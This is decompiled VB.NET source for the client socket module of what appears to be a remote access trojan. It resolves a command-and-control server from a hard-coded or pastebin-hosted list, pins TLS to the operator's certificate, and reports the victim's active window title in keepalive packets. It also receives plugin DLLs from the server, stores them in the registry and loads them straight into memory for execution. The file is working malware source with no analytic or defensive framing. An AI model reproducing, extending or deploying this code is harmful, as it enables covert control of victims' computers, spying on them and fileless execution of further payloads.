Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Linq
Imports System.Net
Imports System.Net.Security
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Security.Authentication
Imports System.Security.Cryptography.X509Certificates
Imports System.Text
Imports System.Threading
Imports Client.Helper
Imports MessagePackLib.MessagePack
Imports Microsoft.CSharp.RuntimeBinder

Namespace Client.Connection
	' Token: 0x02000004 RID: 4
	Public Module ClientSocket
		' Token: 0x17000001 RID: 1
		' (get) Token: 0x06000006 RID: 6 RVA: 0x00002060 File Offset: 0x00000260
		' (set) Token: 0x06000007 RID: 7 RVA: 0x00002067 File Offset: 0x00000267
		Public Property TcpClient As Socket

		' Token: 0x17000002 RID: 2
		' (get) Token: 0x06000008 RID: 8 RVA: 0x0000206F File Offset: 0x0000026F
		' (set) Token: 0x06000009 RID: 9 RVA: 0x00002076 File Offset: 0x00000276
		Public Property SslClient As SslStream

		' Token: 0x17000003 RID: 3
		' (get) Token: 0x0600000A RID: 10 RVA: 0x0000207E File Offset: 0x0000027E
		' (set) Token: 0x0600000B RID: 11 RVA: 0x00002085 File Offset: 0x00000285
		Private Property Buffer As Byte()

		' Token: 0x17000004 RID: 4
		' (get) Token: 0x0600000C RID: 12 RVA: 0x0000208D File Offset: 0x0000028D
		' (set) Token: 0x0600000D RID: 13 RVA: 0x00002094 File Offset: 0x00000294
		Private Property HeaderSize As Long

		' Token: 0x17000005 RID: 5
		' (get) Token: 0x0600000E RID: 14 RVA: 0x0000209C File Offset: 0x0000029C
		' (set) Token: 0x0600000F RID: 15 RVA: 0x000020A3 File Offset: 0x000002A3
		Private Property Offset As Long

		' Token: 0x17000006 RID: 6
		' (get) Token: 0x06000010 RID: 16 RVA: 0x000020AB File Offset: 0x000002AB
		' (set) Token: 0x06000011 RID: 17 RVA: 0x000020B2 File Offset: 0x000002B2
		Private Property KeepAlive As Timer

		' Token: 0x17000007 RID: 7
		' (get) Token: 0x06000012 RID: 18 RVA: 0x000020BA File Offset: 0x000002BA
		' (set) Token: 0x06000013 RID: 19 RVA: 0x000020C1 File Offset: 0x000002C1
		Public Property IsConnected As Boolean

		' Token: 0x17000008 RID: 8
		' (get) Token: 0x06000014 RID: 20 RVA: 0x000020C9 File Offset: 0x000002C9
		Private ReadOnly Property SendSync As Object = New Object()

		' Token: 0x17000009 RID: 9
		' (get) Token: 0x06000015 RID: 21 RVA: 0x000020D0 File Offset: 0x000002D0
		' (set) Token: 0x06000016 RID: 22 RVA: 0x000020D7 File Offset: 0x000002D7
		Private Property Ping As Timer

		' Token: 0x1700000A RID: 10
		' (get) Token: 0x06000017 RID: 23 RVA: 0x000020DF File Offset: 0x000002DF
		' (set) Token: 0x06000018 RID: 24 RVA: 0x000020E6 File Offset: 0x000002E6
		Public Property Interval As Integer

		' Token: 0x1700000B RID: 11
		' (get) Token: 0x06000019 RID: 25 RVA: 0x000020EE File Offset: 0x000002EE
		' (set) Token: 0x0600001A RID: 26 RVA: 0x000020F5 File Offset: 0x000002F5
		Public Property ActivatePo_ng As Boolean

		' Token: 0x0600001B RID: 27 RVA: 0x00002AC4 File Offset: 0x00000CC4
		Public Sub InitializeClient()
			Try
				ClientSocket.TcpClient = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) With { .ReceiveBufferSize = 51200, .SendBufferSize = 51200 }
				If Settings.Paste_bin = "null" Then
					Dim text As String = Settings.Hos_ts.Split(New Char() { ","c })(New Random().[Next](Settings.Hos_ts.Split(New Char() { ","c }).Length))
					Dim num As Integer = Convert.ToInt32(Settings.Por_ts.Split(New Char() { ","c })(New Random().[Next](Settings.Por_ts.Split(New Char() { ","c }).Length)))
					If ClientSocket.IsValidDomainName(text) Then
						For Each ipaddress As IPAddress In Dns.GetHostAddresses(text)
							Try
								ClientSocket.TcpClient.Connect(ipaddress, num)
								If ClientSocket.TcpClient.Connected Then
									Exit Try
								End If
							Catch
							End Try
						Next
					Else
						ClientSocket.TcpClient.Connect(text, num)
					End If
				Else
					Using webClient As WebClient = New WebClient()
						Dim networkCredential As NetworkCredential = New NetworkCredential("", "")
						webClient.Credentials = networkCredential
						Dim array As String() = webClient.DownloadString(Settings.Paste_bin).Split(New String() { ":" }, StringSplitOptions.None)
						Settings.Hos_ts = array(0)
						Settings.Por_ts = array(New Random().[Next](1, array.Length))
						ClientSocket.TcpClient.Connect(Settings.Hos_ts, Convert.ToInt32(Settings.Por_ts))
					End Using
				End If
				If ClientSocket.TcpClient.Connected Then
					ClientSocket.IsConnected = True
					ClientSocket.SslClient = New SslStream(New NetworkStream(ClientSocket.TcpClient, True), False, AddressOf ClientSocket.ValidateServerCertificate)
					ClientSocket.SslClient.AuthenticateAsClient(ClientSocket.TcpClient.RemoteEndPoint.ToString().Split(New Char() { ":"c })(0), Nothing, SslProtocols.Tls, False)
					ClientSocket.HeaderSize = 4L
					ClientSocket.Buffer = New Byte(ClientSocket.HeaderSize - 1) {}
					ClientSocket.Offset = 0L
					ClientSocket.Send(IdSender.SendInfo())
					ClientSocket.Interval = 0
					ClientSocket.ActivatePo_ng = False
					ClientSocket.KeepAlive = AddressOf ClientSocket.KeepAlivePacket
					ClientSocket.Ping = AddressOf ClientSocket.Po_ng
					ClientSocket.SslClient.BeginRead(ClientSocket.Buffer, CInt(ClientSocket.Offset), CInt(ClientSocket.HeaderSize), AddressOf ClientSocket.ReadServertData, Nothing)
				Else
					ClientSocket.IsConnected = False
				End If
			Catch
				ClientSocket.IsConnected = False
			End Try
		End Sub

		' Token: 0x0600001C RID: 28 RVA: 0x000020FD File Offset: 0x000002FD
		Private Function IsValidDomainName(name As String) As Boolean
			Return Uri.CheckHostName(name) > UriHostNameType.Unknown
		End Function

		' Token: 0x0600001D RID: 29 RVA: 0x00002108 File Offset: 0x00000308
		Private Function ValidateServerCertificate(sender As Object, certificate As X509Certificate, chain As X509Chain, sslPolicyErrors As SslPolicyErrors) As Boolean
			Return Settings.Server_Certificate.Equals(certificate)
		End Function

		' Token: 0x0600001E RID: 30 RVA: 0x00002E10 File Offset: 0x00001010
		Public Sub Reconnect()
			Try
				Dim ping As Timer = ClientSocket.Ping
				If ping IsNot Nothing Then
					ping.Dispose()
				End If
				Dim keepAlive As Timer = ClientSocket.KeepAlive
				If keepAlive IsNot Nothing Then
					keepAlive.Dispose()
				End If
				Dim sslClient As SslStream = ClientSocket.SslClient
				If sslClient IsNot Nothing Then
					sslClient.Dispose()
				End If
				Dim tcpClient As Socket = ClientSocket.TcpClient
				If tcpClient IsNot Nothing Then
					tcpClient.Dispose()
				End If
			Catch
			End Try
			ClientSocket.IsConnected = False
		End Sub

		' Token: 0x0600001F RID: 31 RVA: 0x00002E98 File Offset: 0x00001098
		Public Sub ReadServertData(ar As IAsyncResult)
			Try
				If Not ClientSocket.TcpClient.Connected OrElse Not ClientSocket.IsConnected Then
					ClientSocket.IsConnected = False
				Else
					Dim num As Integer = ClientSocket.SslClient.EndRead(ar)
					If num > 0 Then
						ClientSocket.Offset += CLng(num)
						ClientSocket.HeaderSize -= CLng(num)
						If ClientSocket.HeaderSize = 0L Then
							ClientSocket.HeaderSize = CLng(BitConverter.ToInt32(ClientSocket.Buffer, 0))
							If ClientSocket.HeaderSize > 0L Then
								ClientSocket.Offset = 0L
								ClientSocket.Buffer = New Byte(ClientSocket.HeaderSize - 1) {}
								While ClientSocket.HeaderSize > 0L
									Dim num2 As Integer = ClientSocket.SslClient.Read(ClientSocket.Buffer, CInt(ClientSocket.Offset), CInt(ClientSocket.HeaderSize))
									If num2 <= 0 Then
										ClientSocket.IsConnected = False
										Return
									End If
									ClientSocket.Offset += CLng(num2)
									ClientSocket.HeaderSize -= CLng(num2)
									If ClientSocket.HeaderSize < 0L Then
										ClientSocket.IsConnected = False
										Return
									End If
								End While
								AddressOf ClientSocket.Read.Start(ClientSocket.Buffer)
								ClientSocket.Offset = 0L
								ClientSocket.HeaderSize = 4L
								ClientSocket.Buffer = New Byte(ClientSocket.HeaderSize - 1) {}
							Else
								ClientSocket.HeaderSize = 4L
								ClientSocket.Buffer = New Byte(ClientSocket.HeaderSize - 1) {}
								ClientSocket.Offset = 0L
							End If
						ElseIf ClientSocket.HeaderSize < 0L Then
							ClientSocket.IsConnected = False
							Return
						End If
						ClientSocket.SslClient.BeginRead(ClientSocket.Buffer, CInt(ClientSocket.Offset), CInt(ClientSocket.HeaderSize), AddressOf ClientSocket.ReadServertData, Nothing)
					Else
						ClientSocket.IsConnected = False
					End If
				End If
			Catch
				ClientSocket.IsConnected = False
			End Try
		End Sub

		' Token: 0x06000020 RID: 32 RVA: 0x0000307C File Offset: 0x0000127C
		Public Sub Send(msg As Byte())
			Dim sendSync As Object = ClientSocket.SendSync
			SyncLock sendSync
				Try
					If ClientSocket.IsConnected Then
						Dim bytes As Byte() = BitConverter.GetBytes(msg.Length)
						ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite)
						ClientSocket.SslClient.Write(bytes, 0, bytes.Length)
						If msg.Length > 1000000 Then
							Using memoryStream As MemoryStream = New MemoryStream(msg)
								memoryStream.Position = 0L
								Dim array As Byte() = New Byte(49999) {}
								While True
									Dim num As Integer = memoryStream.Read(array, 0, array.Length)
									Dim num2 As Integer = num
									If num <= 0 Then
										Exit For
									End If
									ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite)
									ClientSocket.SslClient.Write(array, 0, num2)
									ClientSocket.SslClient.Flush()
								End While
								GoTo IL_E5
							End Using
						End If
						ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite)
						ClientSocket.SslClient.Write(msg, 0, msg.Length)
						ClientSocket.SslClient.Flush()
						IL_E5:
					End If
				Catch
					ClientSocket.IsConnected = False
				End Try
			End SyncLock
		End Sub

		' Token: 0x06000021 RID: 33 RVA: 0x000031B4 File Offset: 0x000013B4
		Public Sub KeepAlivePacket(obj As Object)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Pac_ket").AsString = "Ping"
				msgPack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle()
				ClientSocket.Send(msgPack.Encode2Bytes())
				GC.Collect()
				ClientSocket.ActivatePo_ng = True
			Catch
			End Try
		End Sub

		' Token: 0x06000022 RID: 34 RVA: 0x00003220 File Offset: 0x00001420
		Private Sub Po_ng(obj As Object)
			Try
				If ClientSocket.ActivatePo_ng AndAlso ClientSocket.IsConnected Then
					ClientSocket.Interval += 1
				End If
			Catch
			End Try
		End Sub

		' Token: 0x06000023 RID: 35 RVA: 0x00003268 File Offset: 0x00001468
		Public Sub Read(data As Object)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.DecodeFromBytes(CType(data, Byte()))
				Dim asString As String = msgPack.ForcePathObject("Pac_ket").AsString
				If Not(asString = "Po_ng") Then
					If Not(asString = "plu_gin") Then
						If Not(asString = "save_Plugin") Then
							GoTo IL_1C7
						End If
					Else
						Try
							If SetRegistry.GetValue(msgPack.ForcePathObject("Dll").AsString) Is Nothing Then
								ClientSocket.Packs.Add(msgPack)
								Dim msgPack2 As MsgPack = New MsgPack()
								msgPack2.ForcePathObject("Pac_ket").SetAsString("sendPlugin")
								msgPack2.ForcePathObject("Hashes").SetAsString(msgPack.ForcePathObject("Dll").AsString)
								ClientSocket.Send(msgPack2.Encode2Bytes())
							Else
								ClientSocket.Invoke(msgPack)
							End If
							GoTo IL_1C7
						Catch ex As Exception
							ClientSocket.[Error](ex.Message)
							GoTo IL_1C7
						End Try
					End If
					SetRegistry.SetValue(msgPack.ForcePathObject("Hash").AsString, msgPack.ForcePathObject("Dll").GetAsBytes())
					For Each msgPack3 As MsgPack In ClientSocket.Packs.ToList()
						If msgPack3.ForcePathObject("Dll").AsString = msgPack.ForcePathObject("Hash").AsString Then
							ClientSocket.Invoke(msgPack3)
							ClientSocket.Packs.Remove(msgPack3)
						End If
					Next
				Else
					ClientSocket.ActivatePo_ng = False
					Dim msgPack4 As MsgPack = New MsgPack()
					msgPack4.ForcePathObject("Pac_ket").SetAsString("Po_ng")
					msgPack4.ForcePathObject("Message").SetAsInteger(CLng(ClientSocket.Interval))
					ClientSocket.Send(msgPack4.Encode2Bytes())
					ClientSocket.Interval = 0
				End If
				IL_1C7:
			Catch ex2 As Exception
				ClientSocket.[Error](ex2.Message)
			End Try
		End Sub

		' Token: 0x06000024 RID: 36 RVA: 0x0000349C File Offset: 0x0000169C
		Private Sub Invoke(unpack_msgpack As MsgPack)
			Dim obj As Object = Activator.CreateInstance(AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))).[GetType]("Plugin.Plugin"))
			If ClientSocket.<>o__53.<>p__0 Is Nothing Then
				ClientSocket.<>o__53.<>p__0 = CallSite(Of Action(Of CallSite, Object, Socket, X509Certificate2, String, Byte(), Mutex, String, String, String)).Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", Nothing, GetType(ClientSocket), New CSharpArgumentInfo() { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, Nothing), CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, Nothing), CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, Nothing), CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, Nothing), CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, Nothing), CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, Nothing), CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, Nothing), CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, Nothing), CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, Nothing) }))
			End If
			ClientSocket.<>o__53.<>p__0.Target(ClientSocket.<>o__53.<>p__0, obj, ClientSocket.TcpClient, Settings.Server_Certificate, Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall)
			ClientSocket.Received()
		End Sub

		' Token: 0x06000025 RID: 37 RVA: 0x00002115 File Offset: 0x00000315
		Private Sub Received()
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Pac_ket").AsString = Encoding.[Default].GetString(Convert.FromBase64String("UmVjZWl2ZWQ="))
			ClientSocket.Send(msgPack.Encode2Bytes())
			Thread.Sleep(1000)
		End Sub

		' Token: 0x06000026 RID: 38 RVA: 0x00002154 File Offset: 0x00000354
		Public Sub [Error](ex As String)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Pac_ket").AsString = "Error"
			msgPack.ForcePathObject("Error").AsString = ex
			ClientSocket.Send(msgPack.Encode2Bytes())
		End Sub

		' Token: 0x0400001F RID: 31
		Public Packs As List(Of MsgPack) = New List(Of MsgPack)()
	End Module
End Namespace
